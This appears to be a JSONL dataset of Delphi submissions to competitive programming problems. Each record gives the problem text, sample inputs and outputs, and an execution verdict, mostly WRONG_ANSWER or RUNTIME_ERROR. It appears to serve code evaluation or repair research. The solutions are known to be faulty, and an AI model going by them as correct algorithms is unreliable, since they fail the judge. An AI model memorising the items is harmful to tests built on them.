{"difficulty":1600,"lang":"Delphi","lang_cluster":"delphi","src_uid":"209_A","submission_id":"1914166","tags":["dp","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"program ProjectA;\r\n\r\n{$APPTYPE CONSOLE}\r\n{$A+,B-,D-,E+,F+,G-,I-,L-,N+,R-,Q-,S-,V+,X+}\r\n\r\nuses\r\n  SysUtils,\r\n  Math;\r\n\r\nconst\r\n  inf = 1000000000000000000;\r\n  base = 1000000007;\r\n\r\nvar\r\n  d: array [1..1000001, 1..2] of integer;\r\n  n, i: integer;\r\n\r\nprocedure panic(x: integer);\r\nbegin\r\n  write(x);\r\n  halt(0);\r\nend;\r\n\r\nprocedure swap(var qx, qy: integer);\r\nvar\r\n  qz: integer;\r\nbegin\r\n  qz := qx;\r\n  qx := qy;\r\n  qy := qz;\r\nend;\r\n\r\nbegin\r\n  {$IFNDEF ONLINE_JUDGE}\r\n  Reset(input, 'input.txt');\r\n  Rewrite(output, 'output.txt');\r\n  {$ENDIF}\r\n\r\n  read(n);\r\n  if n = 1 then\r\n    panic(1);\r\n  d[1, 1] := 1;\r\n  d[1, 2] := 0;\r\n  for i := 2 to n do\r\n    if odd(i) then\r\n      begin\r\n        d[i, 1] := (d[i - 1, 2] + d[i - 1, 1] + 1) mod base;\r\n        d[i, 2] := d[i - 1, 2];\r\n      end\r\n    else\r\n      begin\r\n        d[i, 2] := (d[i - 1, 1] + d[i - 1, 2] + 1) mod base;\r\n        d[i, 1] := d[i - 1, 1];\r\n      end;\r\n\r\n  write(d[n, 1] + d[n, 2]);\r\n\r\n\r\nend.\r\n","description":"Polycarpus plays with red and blue marbles. He put n marbles from the left to the right in a row. As it turned out, the marbles form a zebroid.A non-empty sequence of red and blue marbles is a zebroid, if the colors of the marbles in this sequence alternate. For example, sequences (red; blue; red) and (blue) are zebroids and sequence (red; red) is not a zebroid.Now Polycarpus wonders, how many ways there are to pick a zebroid subsequence from this sequence. Help him solve the problem, find the number of ways modulo 1000000007 (10^9+7).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2264n\u226410^6) \u2014 the number of marbles in Polycarpus's sequence.\n","output_spec":"Print a single number \u2014 the answer to the problem modulo 1000000007 (10^9+7).\n","notes":"Let's consider the first test sample. Let's assume that Polycarpus initially had sequence (red; blue; red), so there are six ways to pick a zebroid: \n  pick the first marble;  pick the second marble;  pick the third marble;  pick the first and second marbles;  pick the second and third marbles;  pick the first, second and third marbles. It can be proven that if Polycarpus picks (blue; red; blue) as the initial sequence, the number of ways won't change.\n","sample_inputs":["3\n","4\n"],"sample_outputs":["6\n","11\n"]}
{"difficulty":1700,"lang":"Delphi","lang_cluster":"delphi","src_uid":"219_D","submission_id":"2771110","tags":["dfs+and+similar","dp","graphs","trees"],"exec_outcome":"WRONG_ANSWER","source_code":"Var m:array [1..2,1..400000] of LongInt;\r\nz:array [1..400000] of longint;\r\ndp:array [1..200000] of longint;\r\nused:array [1..200000] of Boolean;\r\nmin,kol,i,n:longint;\r\nprocedure sort(l,r:longint);\r\nVar i,j,k,x,b:longint;\r\nbegin\r\n  i:=l; j:=r; k:=(l+r) div 2; x:=m[1,k];\r\n  repeat\r\n    while m[1,i]<x do Inc(i);\r\n    while m[1,j]>x do dec(j);\r\n    if i<=j\r\n    then begin\r\n          b:=m[1,i]; m[1,i]:=m[1,j]; m[1,j]:=b;\r\n          b:=m[2,i]; m[2,i]:=m[2,j]; m[2,j]:=b;\r\n          b:=z[i]; z[i]:=z[j]; z[j]:=b;\r\n          inc(i); Dec(j);\r\n         end;\r\n  until i>j;\r\n  if i<r\r\n  then sort(i,r);\r\n  if j>l\r\n  then sort(l,j);\r\nend;\r\nprocedure rec(v:longint);\r\nVar rr,i,l,r,k:longint;\r\nbegin\r\n  used[v]:=True;\r\n  l:=1; r:=kol+1;\r\n  for i:=1 to 20 do\r\n  begin\r\n    k:=(l+r) div 2;\r\n    if m[1,k]>=v\r\n    then r:=k\r\n    else l:=k;\r\n  end;\r\n  rr:=r;\r\n  l:=1; r:=kol+1;\r\n  for i:=1 to 20 do\r\n  begin\r\n    k:=(l+r) div 2;\r\n    if m[1,k]<=v\r\n    then l:=k\r\n    else r:=k;\r\n  end;\r\n  if m[1,rr]=v\r\n  then begin\r\n        for i:=rr to l do\r\n        if used[m[2,i]]=False\r\n        then begin\r\n              dp[1]:=dp[1]+z[i];\r\n              rec(m[2,i]);\r\n            end;\r\n       end;\r\nend;\r\nprocedure probeg(v:longint);\r\nVar rr,i,l,r,k:longint;\r\nbegin\r\n  used[v]:=true;\r\n  l:=1; r:=kol+1;\r\n  for i:=1 to 20 do\r\n  begin\r\n    k:=(l+r) div 2;\r\n    if m[1,k]>=v\r\n    then r:=k\r\n    else l:=k;\r\n  end;\r\n  rr:=r;\r\n  l:=1; r:=kol+1;\r\n  for i:=1 to 20 do\r\n  begin\r\n    k:=(l+r) div 2;\r\n    if m[1,k]<=v\r\n    then l:=k\r\n    else r:=k;\r\n  end;\r\n  if m[1,rr]=v\r\n  then begin\r\n        for i:=rr to l do\r\n        if used[m[2,i]]=False\r\n        then begin\r\n              if z[i]=0\r\n              then dp[m[2,i]]:=dp[v]+1\r\n              else dp[m[2,i]]:=dp[v]-1;\r\n              probeg(m[2,i]);\r\n            end;\r\n\r\n       end;\r\nend;\r\n\r\nbegin\r\n \/\/ Assign(input,'input.txt');\r\n \/\/ assign(output,'output.txt');\r\n  Readln(n);\r\n  kol:=0;\r\n  for i:=1 to n-1 do\r\n  begin\r\n    Inc(kol);\r\n    read(m[1,kol],m[2,kol]);\r\n    inc(kol);\r\n    m[1,kol]:=m[2,kol-1];\r\n    m[2,kol]:=m[1,kol-1];\r\n    z[kol]:=1;\r\n  end;  \r\n  sort(1,kol-1);\r\n  rec(1);\r\n  FillChar(used,SizeOf(used),false);\r\n  probeg(1);\r\n  min:=maxint;\r\n  for i:=1 to n do\r\n  if dp[i]<min\r\n  then min:=dp[i];\r\n  writeln(min);\r\n  for i:=1 to n do\r\n  if dp[i]=min\r\n  then write(i,' ');\r\nend.","description":"The country Treeland consists of n cities, some pairs of them are connected with unidirectional roads. Overall there are n-1 roads in the country. We know that if we don't take the direction of the roads into consideration, we can get from any city to any other one.The council of the elders has recently decided to choose the capital of Treeland. Of course it should be a city of this country. The council is supposed to meet in the capital and regularly move from the capital to other cities (at this stage nobody is thinking about getting back to the capital from these cities). For that reason if city a is chosen a capital, then all roads must be oriented so that if we move along them, we can get from city a to any other city. For that some roads may have to be inversed.Help the elders to choose the capital so that they have to inverse the minimum number of roads in the country.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (2\u2264n\u22642\u00b710^5) \u2014 the number of cities in Treeland. Next n-1 lines contain the descriptions of the roads, one road per line. A road is described by a pair of integers si,ti (1\u2264si,ti\u2264n;\u00a0si\u2260ti) \u2014 the numbers of cities, connected by that road. The i-th road is oriented from city si to city ti. You can consider cities in Treeland indexed from 1 to n.\n","output_spec":"In the first line print the minimum number of roads to be inversed if the capital is chosen optimally. In the second line print all possible ways to choose the capital \u2014 a sequence of indexes of cities in the increasing order.\n","notes":null,"sample_inputs":["3\n2 1\n2 3\n","4\n1 4\n2 4\n3 4\n"],"sample_outputs":["0\n2 \n","2\n1 2 3 \n"]}
{"difficulty":1700,"lang":"Delphi","lang_cluster":"delphi","src_uid":"22_C","submission_id":"15142276","tags":["graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"program task;\r\n\r\n{$APPTYPE CONSOLE}\r\n{$MAXSTACKSIZE 1000000000}\r\n{$R-,Q-,S-,O+}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nconst\r\n  maxn=1000;\r\n  eps=0.000001;\r\n\r\nvar n,m,v,i,k,j:integer;\r\n\r\nbegin\r\n\/\/  reset(input,'a.in');\r\n\/\/  rewrite(output,'a.out');\r\n  read(n,m,v);\r\n  if (m<n-1) or (m>(n-1)*(n-2) div 2 + 1) then begin\r\n    writeln(-1);\r\n    Halt(0);\r\n  end;\r\n  for i:=1 to n do\r\n    if i<>v then writeln(v,' ',i);\r\n  m:=m-(n-1);\r\n  k:=1;\r\n  if v=1 then k:=2;\r\n  for i:=k+1 to n do\r\n    for j:=i+1 to n do\r\n      if (i<>v) and (j<>v) then begin\r\n        if m=0 then Halt(0);\r\n        writeln(i,' ',j);\r\n        dec(m);\r\n      end;\r\nend.\r\n","description":"Bob got a job as a system administrator in X corporation. His first task was to connect n servers with the help of m two-way direct connection so that it becomes possible to transmit data from one server to any other server via these connections. Each direct connection has to link two different servers, each pair of servers should have at most one direct connection. Y corporation, a business rival of X corporation, made Bob an offer that he couldn't refuse: Bob was asked to connect the servers in such a way, that when server with index v fails, the transmission of data between some other two servers becomes impossible, i.e. the system stops being connected. Help Bob connect the servers.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains 3 space-separated integer numbers n, m, v (3\u2264n\u226410^5,0\u2264m\u226410^5,1\u2264v\u2264n), n \u2014 amount of servers, m \u2014 amount of direct connections, v \u2014 index of the server that fails and leads to the failure of the whole system.\n","output_spec":"If it is impossible to connect the servers in the required way, output -1. Otherwise output m lines with 2 numbers each \u2014 description of all the direct connections in the system. Each direct connection is described by two numbers \u2014 indexes of two servers, linked by this direct connection. The servers are numbered from 1. If the answer is not unique, output any.\n","notes":null,"sample_inputs":["5 6 3\n","6 100 1\n"],"sample_outputs":["1 2\n2 3\n3 4\n4 5\n1 3\n3 5\n","-1\n"]}
{"difficulty":2200,"lang":"Delphi","lang_cluster":"delphi","src_uid":"255_E","submission_id":"2803957","tags":["games","implementation","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"{$R+,Q+,I+}\r\n{$apptype console}\r\nUses SysUtils,math;\r\nVar\r\n   a:Array[0..100000] of Int64;\r\n   g:Array[0..2500000] of Int64;\r\n   i,j:Integer;\r\n   x:Array[0..2500000,0..10] of Int64;\r\n   n,l,r,p,ans:Int64;\r\n   s:Real;\r\nBegin\r\n   Read(n);\r\n   For i:=1 To n Do Read(a[i]);\r\n   For i:=1 To 2500000 Do Begin\r\n      For j:=max(1,Round(sqrt(sqrt(i)))-3) To max(1,Round(sqrt(sqrt(i)))-3)+6 Do\r\n         If j*j*j*j>=i Then Break;\r\n      l:=j;\r\n      For j:=Round(sqrt(i))+3 DownTo max(1,Round(sqrt(i))-3) Do\r\n         If j*j<=i Then Break;\r\n      r:=j;\r\n      If l>r Then g[i]:=0\r\n      Else Begin\r\n         For j:=0 To 10 Do\r\n            If x[r,j]-x[l-1,j]=0 Then Begin\r\n               g[i]:=j;\r\n               Break;\r\n         End;\r\n      End;\r\n      For j:=0 To 10 Do\r\n         If g[i]=j Then x[i,j]:=x[i-1,j]+1\r\n                   Else x[i,j]:=x[i-1,j];\r\n   End;\r\n   For i:=1 To n Do Begin\r\n      s:=a[i];\r\n      For j:=max(1,Round(sqrt(sqrt(s)))-3) To max(1,Round(sqrt(sqrt(s)))-3)+6 Do\r\n         If j*j*j*j>=a[i] Then Break;\r\n      l:=j;\r\n      For j:=Round(sqrt(s))+3 DownTo max(1,Round(sqrt(s))-3) Do\r\n         If j*j<=a[i] Then Break;\r\n      r:=j;\r\n      If l>r Then p:=0\r\n      Else Begin\r\n         For j:=0 To 10 Do \r\n            If x[r,j]-x[l-1,j]=0 Then Begin\r\n               p:=j;\r\n               Break;\r\n            End;\r\n      End;\r\n      If a[i]=1 Then p:=0;\r\n      If i=1 Then ans:=p\r\n      Else ans:=ans xor p;\r\n   End;\r\n   If ans<>0 Then Write('Furlo')\r\n             Else Write('Rublo');\r\nEnd.\r\n      \r\n      \r\n","description":"Furlo and Rublo play a game. The table has n piles of coins lying on it, the i-th pile has ai coins. Furlo and Rublo move in turns, Furlo moves first. In one move you are allowed to:  choose some pile, let's denote the current number of coins in it as x;  choose some integer y (0\u2264y<x;\u00a0x^1\/4\u2264y\u2264x^1\/2) and decrease the number of coins in this pile to y. In other words, after the described move the pile will have y coins left. The player who can't make a move, loses. Your task is to find out, who wins in the given game if both Furlo and Rublo play optimally well.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2264n\u226477777) \u2014 the number of piles. The next line contains n integers a1,a2,...,an (1\u2264ai\u2264777777777777) \u2014 the sizes of piles. The numbers are separated by single spaces.\nPlease, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.\n","output_spec":"If both players play optimally well and Furlo wins, print \"Furlo\", otherwise print \"Rublo\". Print the answers without the quotes.\n","notes":null,"sample_inputs":["1\n1\n","2\n1 2\n","10\n1 2 3 4 5 6 7 8 9 10\n"],"sample_outputs":["Rublo\n","Rublo\n","Furlo\n"]}
{"difficulty":1800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"271_D","submission_id":"5991582","tags":["data+structures","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"var\r\n    s,str,t:ansistring;\r\n    p:array['a'..'z'] of boolean;\r\n    bor:array[0..3250000,'a'..'z'] of longint;\r\n    i,j,m,l,x,ans:longint;\r\n    c:char;\r\n    \r\nprocedure add(s:ansistring);\r\nvar\r\n    v,k:longint;\r\nbegin\r\n    v:=0;\r\n    for k:=1 to length(s) do\r\n        begin\r\n            if bor[v][s[k]] = 0 then\r\n                begin\r\n                    inc(x);\r\n                    bor[v][s[k]]:=x;\r\n                end;\r\n            v:=bor[v][s[k]];\r\n        end;\r\nend;\r\n    \r\nBegin\r\n    readln(s);\r\n    readln(t);\r\n    for i:=0 to 25 do\r\n        if t[i+1] = '0' then\r\n            p[chr(i + ord('a'))]:=true;\r\n    readln(m);\r\n    for i:=1 to length(s) do\r\n        begin\r\n            j:=i; l:=0; str:='';\r\n            while true do\r\n                begin\r\n                    if (l > m) or (j > length(s)) then  break;\r\n                    if p[s[j]] then inc(l);\r\n                    if l <= m then\r\n                        str:=str+ s[j];\r\n                    if l = m then\r\n                        add(str);\r\n                    inc(j);\r\n                end;\r\n        end;\r\n    writeln(x);\r\nend.\r\n","description":"You've got string s, consisting of small English letters. Some of the English letters are good, the rest are bad.A substring s[l...r] (1\u2264l\u2264r\u2264|s|) of string s=s1s2...s|s| (where |s| is the length of string s) is string slsl+1...sr.The substring s[l...r] is good, if among the letters sl,sl+1,...,sr there are at most k bad ones (look at the sample's explanation to understand it more clear).Your task is to find the number of distinct good substrings of the given string s. Two substrings s[x...y] and s[p...q] are considered distinct if their content is different, i.e. s[x...y]\u2260s[p...q].","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input is the non-empty string s, consisting of small English letters, the string's length is at most 1500 characters.\nThe second line of the input is the string of characters \"0\" and \"1\", the length is exactly 26 characters. If the i-th character of this string equals \"1\", then the i-th English letter is good, otherwise it's bad. That is, the first character of this string corresponds to letter \"a\", the second one corresponds to letter \"b\" and so on.\nThe third line of the input consists a single integer k (0\u2264k\u2264|s|) \u2014 the maximum acceptable number of bad characters in a good substring.\n","output_spec":"Print a single integer \u2014 the number of distinct good substrings of string s.\n","notes":"In the first example there are following good substrings: \"a\", \"ab\", \"b\", \"ba\", \"bab\".\nIn the second example there are following good substrings: \"a\", \"aa\", \"ac\", \"b\", \"ba\", \"c\", \"ca\", \"cb\".\n","sample_inputs":["ababab\n01000000000000000000000000\n1\n","acbacbacaa\n00000000000000000000000000\n2\n"],"sample_outputs":["5\n","8\n"]}
{"difficulty":1900,"lang":"Delphi","lang_cluster":"delphi","src_uid":"342_C","submission_id":"4448598","tags":["geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\nvar\r\n  h, r : integer;\r\nbegin\r\n  read(r, h);\r\n  if h >= r then begin\r\n      if h mod r > r div 2 then\r\n          write(trunc(h \/ r * 2 + 2))\r\n      else\r\n          write(trunc(h \/ r * 2 + 1));\r\n  end\r\n  else\r\n      write(2);\r\nend.","description":"A girl named Xenia has a cupboard that looks like an arc from ahead. The arc is made of a semicircle with radius r (the cupboard's top) and two walls of height h (the cupboard's sides). The cupboard's depth is r, that is, it looks like a rectangle with base r and height h+r from the sides. The figure below shows what the cupboard looks like (the front view is on the left, the side view is on the right). Xenia got lots of balloons for her birthday. The girl hates the mess, so she wants to store the balloons in the cupboard. Luckily, each balloon is a sphere with radius . Help Xenia calculate the maximum number of balloons she can put in her cupboard. You can say that a balloon is in the cupboard if you can't see any part of the balloon on the left or right view. The balloons in the cupboard can touch each other. It is not allowed to squeeze the balloons or deform them in any way. You can assume that the cupboard's walls are negligibly thin.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains two integers r,h (1\u2264r,h\u226410^7).\n","output_spec":"Print a single integer \u2014 the maximum number of balloons Xenia can put in the cupboard.\n","notes":null,"sample_inputs":["1 1\n","1 2\n","2 1\n"],"sample_outputs":["3\n","5\n","2\n"]}
{"difficulty":1600,"lang":"Delphi","lang_cluster":"delphi","src_uid":"46_C","submission_id":"2863850","tags":["two+pointers"],"exec_outcome":"WRONG_ANSWER","source_code":"Uses math;\r\nVar s:string;\r\nrez,j,a,i,n:longint;\r\nm:array [0..1000] of longint;\r\nbegin\r\n\/\/  Assign(Input,'input.txt');\r\n\/\/  Assign(output,'output.txt');\r\n  readln(n);\r\n  readln(s);\r\n  a:=0;\r\n  for i:=1 to n do\r\n  if s[i]='T'\r\n  then inc(a);\r\n  for i:=1 to n do\r\n  begin\r\n    m[i]:=m[i-1];\r\n    if s[i]='H'\r\n    then inc(m[i]);\r\n  end;\r\n  rez:=MaxInt;\r\n  for i:=1 to n do\r\n  begin\r\n    if i-a<1\r\n    then j:=m[i]+m[n]-m[n-(i-a)]\r\n    else j:=m[i]-m[i-a];\r\n    rez:=min(rez,j);\r\n  end;\r\n  writeln(rez);\r\nend.","description":"Today there is going to be an unusual performance at the circus \u2014 hamsters and tigers will perform together! All of them stand in circle along the arena edge and now the trainer faces a difficult task: he wants to swap the animals' positions so that all the hamsters stood together and all the tigers also stood together. The trainer swaps the animals in pairs not to create a mess. He orders two animals to step out of the circle and swap places. As hamsters feel highly uncomfortable when tigers are nearby as well as tigers get nervous when there's so much potential prey around (consisting not only of hamsters but also of yummier spectators), the trainer wants to spend as little time as possible moving the animals, i.e. he wants to achieve it with the minimal number of swaps. Your task is to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains number n (2\u2264n\u22641000) which indicates the total number of animals in the arena. The second line contains the description of the animals' positions. The line consists of n symbols \"H\" and \"T\". The \"H\"s correspond to hamsters and the \"T\"s correspond to tigers. It is guaranteed that at least one hamster and one tiger are present on the arena. The animals are given in the order in which they are located circle-wise, in addition, the last animal stands near the first one.\n","output_spec":"Print the single number which is the minimal number of swaps that let the trainer to achieve his goal.\n","notes":"In the first example we shouldn't move anybody because the animals of each species already stand apart from the other species. In the second example you may swap, for example, the tiger in position 2 with the hamster in position 5 and then \u2014 the tiger in position 9 with the hamster in position 7.\n","sample_inputs":["3\nHTH\n","9\nHTHTHTHHT\n"],"sample_outputs":["0\n","2\n"]}
{"difficulty":1800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"46_D","submission_id":"2375010","tags":["data+structures","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n{$R+}\r\n{$Q+}\r\n{$O-}\r\n\r\nuses\r\n  SysUtils;\r\n\r\ntype Tv=record\r\n  l, r, w, c: longint;\r\nend;\r\n\r\nvar\r\n\r\n  list: ARRAY [0..10000] OF tv;\r\n  t, ans: array [0..10000] of longint;\r\n  q, o, z, y, s, l, r, n, i, f, u: longint;\r\n\r\n\r\nprocedure inv(x, k, w: longint);\r\nvar p: longint;\r\nbegin\r\n    p := list[k].r;\r\n    list[k].r := u+1;\r\n    list[p].l := u+1;\r\n    inc(u);\r\n    if p = 0 then q := u;\r\n    list[u].w := x;\r\n    list[u].l := k;\r\n    list[u].r := p;\r\n    if k > 0 then\r\n      list[u].c := list[list[u].l].c + list[list[u].l].w + l else\r\n    list[u].c := list[list[u].l].c + list[list[u].l].w;\r\n    ans[w] := list[u].c;\r\n    t[w] := u;\r\nend;\r\n\r\nprocedure dl(x: longint);\r\nbegin\r\n  x := t[x];\r\n  list[list[x].l].r := list[x].r;\r\n  list[list[x].r].l := list[x].l;\r\nend;\r\n\r\nfunction serch(x: longint):longint;\r\nvar i: longint;\r\nbegin\r\n  i := 0;\r\n  if list[i].r = 0 then begin\r\n    result := 0;\r\n    exit;\r\n  end;\r\n  while list[i].r<>0 do begin\r\n    if list[i].c + l + list[i].w  + x + r <=list[list[i].r].c then begin\r\n      result := i;\r\n      exit;\r\n    end;\r\n    inc(i);\r\n  end;\r\n\r\n  result := q;\r\nend;\r\n\r\n\r\n\r\nbegin\r\n  {reset(input, 'input.txt');\r\n  rewrite(output, 'output.txt');}\r\n  read(s, l, r, n);\r\n  u := 0;\r\n  q := 0;\r\n  for i := 1 to n do begin\r\n    read(y, f);\r\n    if y = 2 then begin\r\n      dl(f);\r\n    end else begin\r\n      inc(o);\r\n      z := serch(f);\r\n      if z = -1 then ans[o] := -1 else\r\n        if list[z].c + f + l > s then begin\r\n          ans[o] := -1;\r\n        end else\r\n          inv(f, z, o);\r\n    end;\r\n  end;\r\n  for i := 1 to o do\r\n    writeln(ans[i]);\r\n\r\nend.\r\n","description":"Nowadays it is becoming increasingly difficult to park a car in cities successfully. Let's imagine a segment of a street as long as L meters along which a parking lot is located. Drivers should park their cars strictly parallel to the pavement on the right side of the street (remember that in the country the authors of the tasks come from the driving is right side!). Every driver when parking wants to leave for themselves some extra space to move their car freely, that's why a driver is looking for a place where the distance between his car and the one behind his will be no less than b meters and the distance between his car and the one in front of his will be no less than f meters (if there's no car behind then the car can be parked at the parking lot segment edge; the same is true for the case when there're no cars parked in front of the car). Let's introduce an axis of coordinates along the pavement. Let the parking lot begin at point 0 and end at point L. The drivers drive in the direction of the coordinates' increasing and look for the earliest place (with the smallest possible coordinate) where they can park the car. In case there's no such place, the driver drives on searching for his perfect peaceful haven. Sometimes some cars leave the street and free some space for parking. Considering that there never are two moving cars on a street at a time write a program that can use the data on the drivers, entering the street hoping to park there and the drivers leaving it, to model the process and determine a parking lot space for each car.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers L, b \u0438 f (10\u2264L\u2264100000,1\u2264b,f\u2264100). The second line contains an integer n (1\u2264n\u2264100) that indicates the number of requests the program has got. Every request is described on a single line and is given by two numbers. The first number represents the request type. If the request type is equal to 1, then in that case the second number indicates the length of a car (in meters) that enters the street looking for a place to park. And if the request type is equal to 2, then the second number identifies the number of such a request (starting with 1) that the car whose arrival to the parking lot was described by a request with this number, leaves the parking lot. It is guaranteed that that car was parked at the moment the request of the 2 type was made. The lengths of cars are integers from 1 to 1000.\n","output_spec":"For every request of the 1 type print number -1 on the single line if the corresponding car couldn't find place to park along the street. Otherwise, print a single number equal to the distance between the back of the car in its parked position and the beginning of the parking lot zone.\n","notes":null,"sample_inputs":["30 1 2\n6\n1 5\n1 4\n1 5\n2 2\n1 5\n1 4\n","30 1 1\n6\n1 5\n1 4\n1 5\n2 2\n1 5\n1 4\n","10 1 1\n1\n1 12\n"],"sample_outputs":["0\n6\n11\n17\n23\n","0\n6\n11\n17\n6\n","-1\n"]}
{"difficulty":1700,"lang":"Delphi","lang_cluster":"delphi","src_uid":"53_B","submission_id":"2828517","tags":["binary+search","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils,math;\r\nvar\r\nh,w,l,r,i,x,y : int64;\r\nbegin\r\n readln(h,w);\r\n if (h < w) then\r\n begin\r\n  i := h;\r\n  h := w;\r\n  w := i;\r\n end;\r\n i := 0;\r\n x := -1;\r\n y := 1;\r\n while (1 shl i <= h) do\r\n begin\r\n  l := round((1 shl i)*0.8);\r\n  r := round((1 shl i)*1.25);\r\n  if r > extended((1 shl i)*1.25) then dec(r);\r\n  if l <  extended((1 shl i)*0.8) then inc(l);\r\n  r := min(r , w);\r\n  if r < l then begin\r\n   inc(i);\r\n   continue;\r\n  end;\r\n  if (x*y < (1 shl i)*r) then\r\n  begin\r\n   x := 1 shl i;\r\n   y := r;\r\n  end\r\n  else\r\n   if (x*y = (1 shl i)*r) and (1 shl i>x) then\r\n   begin\r\n    x := 1 shl i;\r\n    y := r;\r\n   end;\r\n  inc(i);\r\n end;\r\n i := 0;\r\n while (1 shl i <= w) do\r\n begin\r\n  l := round((1 shl i)*0.8);\r\n  r := round((1 shl i)*1.25);\r\n  if r > extended((1 shl i)*1.25) then dec(r);\r\n  if l <  extended((1 shl i)*0.8) then inc(l);\r\n  r := min(r , h);\r\n  if r < l then begin\r\n   inc(i);\r\n   continue;\r\n  end;\r\n  if (x*y < (1 shl i)*r) then\r\n  begin\r\n   x := 1 shl i;\r\n   y := r;\r\n  end\r\n  else\r\n   if (x*y = (1 shl i)*r) and (1 shl i>x) then\r\n   begin\r\n    x := 1 shl i;\r\n    y := r;\r\n   end;\r\n  inc(i);\r\n end;\r\n writeln(max(y,x),' ',min(x,y));\r\nend.","description":"One popular blog site edits the uploaded photos like this. It cuts a rectangular area out of them so that the ratio of height to width (i.e. the height\/width quotient) can vary from 0.8 to 1.25 inclusively. Besides, at least one side of the cut area should have a size, equal to some power of number 2 (2^x for some integer x). If those rules don't indicate the size of the cut are clearly, then the way with which the cut part possesses the largest area is chosen. Of course, both sides of the cut area should be integer. If there are several answers to this problem, you should choose the answer with the maximal height.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers h and w (1\u2264h,w\u226410^9) which are the height and width of the uploaded photo in pixels.\n","output_spec":"Print two integers which are the height and width of the cut area.\n","notes":null,"sample_inputs":["2 1\n","2 2\n","5 5\n"],"sample_outputs":["1 1\n","2 2\n","5 4\n"]}
{"difficulty":2500,"lang":"Delphi","lang_cluster":"delphi","src_uid":"53_E","submission_id":"2422552","tags":["bitmasks","dp"],"exec_outcome":"RUNTIME_ERROR","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n{$R+,Q+}\r\n\r\nuses\r\n  SysUtils, Math;\r\n\r\nvar\r\n  ans, edge : int64;\r\n  x, n, m, k, i, j, u, v, top : integer;\r\n  a : array[1..10, 1..10] of boolean;\r\n  d : array[0..1023, 0..511] of int64;\r\n  st : array[1..2] of integer;\r\n\r\nbegin\r\n\/\/ reset(input, 'input.txt');\r\n\/\/  rewrite(output, 'output.txt');\r\n\r\n  read(n, m, k);\r\n  for i := 1 to m do begin\r\n    read(u, v);\r\n    a[u][v] := true;\r\n    a[v][u] := true;\r\n  end;\r\n\r\n  ans := 0;\r\n  for i := 1 to 1 shl n - 1 do begin\r\n    j := i;\r\n    u := 1;\r\n    x := 1;\r\n    top := 0;\r\n    while x <= j do begin\r\n      if x and j <> 0 then begin\r\n        inc(top);\r\n        if top <= 2 then\r\n          st[top] := u;\r\n      end;\r\n      x := x shl 1;\r\n      inc(u);\r\n    end;\r\n    if top = 1 then begin\r\n      j := i and (j - 1);\r\n      continue;\r\n    end else\r\n    if top = 2 then begin\r\n      if a[st[1]][st[2]] then\r\n        d[i][j] := 1;\r\n      if (top = k) and (i = 1 shl n - 1) then\r\n        inc(ans, d[i][j]);\r\n\/\/      writeln(i, ' ', j, ' ', d[i][j]);\r\n      j := i and (j - 1);\r\n    end;\r\n    while j <> 0 do begin\r\n      top := 0;\r\n      x := 1;\r\n      while x <= j do begin\r\n        if x and j <> 0 then\r\n          inc(top);\r\n        x := x shl 1;\r\n      end;\r\n      u := 1;\r\n      x := 1;\r\n      while (x <= j) do begin\r\n        if j and x <> 0 then begin\r\n          for v := 1 to n do\r\n            if (a[u][v]) and (i and (1 shl (v - 1)) <> 0) and (j and (1 shl (v - 1)) = 0) then\r\n              inc(d[i][j], d[i xor (1 shl (u - 1))][j xor (1 shl (u - 1)) or (1 shl (v - 1))] + d[i xor (1 shl (u - 1))][j xor (1 shl (u - 1))]);\r\n        end;\r\n        x := x shl 1;\r\n        inc(u);\r\n      end;\r\n      d[i][j] := d[i][j] div top;\r\n      if (top = k) and (i = 1 shl n - 1) then\r\n        inc(ans, d[i][j]);\r\n\/\/      writeln(i, ' ', j, ' ', d[i][j]);\r\n      j := i and (j - 1);\r\n    end;\r\n  end;\r\n\r\n  writeln(ans);\r\n\r\nend.\r\n","description":"Life in Bertown has become hard. The city has too many roads and the government spends too much to maintain them. There are n junctions and m two way roads, at which one can get from each junction to any other one. The mayor wants to close some roads so that the number of roads left totaled to n-1 roads and it were still possible to get from each junction to any other one. Besides, the mayor is concerned with the number of dead ends which are the junctions from which only one road goes. There shouldn't be too many or too few junctions. Having discussed the problem, the mayor and his assistants decided that after the roads are closed, the road map should contain exactly k dead ends. Your task is to count the number of different ways of closing the roads at which the following conditions are met:   There are exactly n-1 roads left.  It is possible to get from each junction to any other one.  There are exactly k dead ends on the resulting map. Two ways are considered different if there is a road that is closed in the first way, and is open in the second one.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers n, m and k (3\u2264n\u226410,n-1\u2264m\u2264n\u00b7(n-1)\/2,2\u2264k\u2264n-1) which represent the number of junctions, roads and dead ends correspondingly. Then follow m lines each containing two different integers v1 and v2 (1\u2264v1,v2\u2264n,v1\u2260v2) which represent the number of junctions connected by another road. There can be no more than one road between every pair of junctions. The junctions are numbered with integers from 1 to n. It is guaranteed that it is possible to get from each junction to any other one along the original roads.\n","output_spec":"Print a single number \u2014 the required number of ways.\n","notes":null,"sample_inputs":["3 3 2\n1 2\n2 3\n1 3\n","4 6 2\n1 2\n2 3\n3 4\n4 1\n1 3\n2 4\n","4 6 3\n1 2\n2 3\n3 4\n4 1\n1 3\n2 